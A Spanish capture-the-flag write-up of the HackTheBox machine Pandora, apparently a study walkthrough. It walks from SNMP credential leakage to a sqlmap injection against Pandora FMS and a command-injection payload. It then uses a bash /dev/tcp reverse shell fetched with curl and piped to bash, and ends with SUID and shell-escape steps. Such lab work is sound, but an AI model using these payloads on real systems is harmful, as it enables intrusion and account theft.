# INICIO BY d4l1

Muy buenas, hoy estaremos tratando la máquina Pandora de HTB.

Como siempre haremos un poco de resumen a lo que nos enfrentaremos, conocimientos y demás.

Empezaremos haciendo un escaner de sistema operativo, (tengo un repositorio con dicho escaneo).

Gracias a ello entendemos que nos estamos enfrentando a una máquina Linux, posteriormente toca un escaner de puertos, para ver si llegaramos a poder sacar alguna información.

```
sudo nmap -sCV -T4 --min-rate 5000 IP
```
Si queremos podemos poner un "-p-" o "-Pn" pero en este caso no se si hara falta.

Nos encontramos con los puertos "22" (SSH) y "80" (HTTP) abiertos.

Lo que haremos primero sera inspeccionar la página a ver que encontramos.

## PROCESO

Lo primero que encontramos nada más entrar es un dominio "panda.htb" lo añadimos
```
echo "ip panda.htb" | sudo tee -a /etc/hosts
```
En este momento, podemos hacer un escaner de directorios o dominios, pero no vamos a encontrar nada importante.

Probaremos a hacer un nuevo escaner de nmap pero en este caso enfocandonos en udp
```
sudo nmap -sU ip
```
Aquí viene lo importante, nos encontramos con tres puertos UDP abiertos y nos centraremos en el 161

### SNMP
Simple Network Management Protocol, protocolo para la gestión de la transferencia de información en redes, especialmente para uso en LAN.

Gracias a esto aprenderemos a usar los comandos para escanear dicho puerto. 

```
snmpwalk  -v 1 -c public IP
```
Posteriormente a esto encontramos algo importante que es un usuario llamado "Daniel" con su respectiva contraseña "HotelBabylon23" para conectarnos por ssh
```
ssh daniel@ip
```
Dentro vemos del directorio /home/matt el "user.txt" pero aún no tenemos los permisos para leerlo.

## MOVIMIENTO LATERAL

El siguiente paso que haremos será ver la página web que en el puerto 80 vimos, como sabemos normalmente las páginas estan guardadas en /var/www con lo cual haremos un ls -a
```
ls -al /var/www
```
Dentro encontramos el directorio "html" y así sabemos y comprobamos que lo tenemos.

El siguiente paso sera ir donde apache guarda los sitios 
```
/etc/apache2/sites-enabled/pandora.conf
```
El cual nos encontramos con este código 
```
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```
Gracias a eso odemos reenviar nuestra conexión al puerto interno del host remoto y luego podremos acceder a su
contenido web. Hay varias formas de realizar el reenvío de puertos, aunque lo haremos utilizando el
Conexión SSH en sí. Usando este túnel, podemos configurar un proxy para ver la página web.
```
ssh -D 9090 daniel@ip
```
También necesitaremos configurar un proxy SOCKS en la extensión del navegador foxy-proxy para poder realizar el
El navegador enruta el tráfico a través del puerto que se reenvía.

Cuando este todo creado, en el navegador ponemos "localhost"

y aquí conseguimos la información de versión de pandora "v7.0NG.742_FIX_PERL2020"

Con esto hemos encontrado [esta](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/) vulnerabilidad

## SQL INJECTION

Con la anterior referencia, entendemos que pandora sufre una Injección SQL, pudiendo hacer un bypass en el proceso "/include/functions_io.php" y debemos pasar la "session_id" en este caso utilizaremos "sql_map" (debo aprender sql injection lose)

Deberemos aprender a utilizar los "proxychains" 

Proxychains es una herramienta que obliga a cualquier conexión TCP realizada por cualquier aplicación a pasar por servidores proxy.
como TOR o cualquier otro proxy SOCKS4, SOCKS5 o HTTP.

Necesitaremos agregar una entrada para nuestro proxy en la sección ProxyList en /etc/proxychains4.conf

```
nano /etc/proxychains4.con
socks5 127.0.0.1 9090 daniel HotelBabylon23
```
Ahora utilizaremos el sqlmap para hacer el escaner.
```
proxychains sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" --current-db
```
Obtenemos la lista "tables"
```
proxychains sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables
```
Ahora con la tabla "sessions_php" sacamos los "session_id"
```
proxychains sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -T tsessions_php --dump
```

(todo esto también podemos utilizar una url si la hemos añadido al dns)

```
echo "ip pandora.panda.htb" | sudo tee -a /etc/hosts
```
Gracias a esto conseguimos las cookies de sesion en mi caso "g4e01qdgk36mfdh90hvcc54umq" y las añadimos al navegador.

Nos conseguimos meter dentro de la cuenta de Matt y vamos a explorar dentro.

Nos damos cuenta que no tenemos privilegios ni podemos hacer gran cosa, e intentaremos hacer una ejecución de código para conectarnos por una shell.

Para coger las Request dentro de BurpSuite deberemos configurar el Sock Proxy dentro de "User options"

Cuando consigamos el request de "events" lo pasaremos a post y le meteremos este payload .
```
page=include%2fajax%2fevents&perform_event_response=10000000&target=whoami&response_id=1
```
y como veremos nos respondera el "whoami" como "matt"

Ahora crearemos una shell en nuestro equipo y agregaremos a la request para que lo descarge 
```
bash -i >& /dev/tcp/ip/1337 0>&1

python3 -m http.server 80

```
y desde el burp suite haremos el curl para descargar
```
curl+ip:80/shell.sh|bash
```
```
sudo nc -lvnp 1337
```
Gracias a esto conseguimos la primera flag de usuario

## PRIVILEGE ESCALATION

Buscaremos para empezar los archivos que tenemos permisos para modificar

```
 find / -perm -4000 2>/dev/null
```
Nos encontramos con un pandora backup vemos que es 
```
 ls -al /usr/bin/pandora_backup
```
Si probamos a iniciar el back_up nos da un error
 ```
 /usr/bin/pandora_backup
```
Podemos probar rompiendo las restriciones de la shel
```
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```
```
python -c "import pty;pty.spawn('/bin/bash')"
```






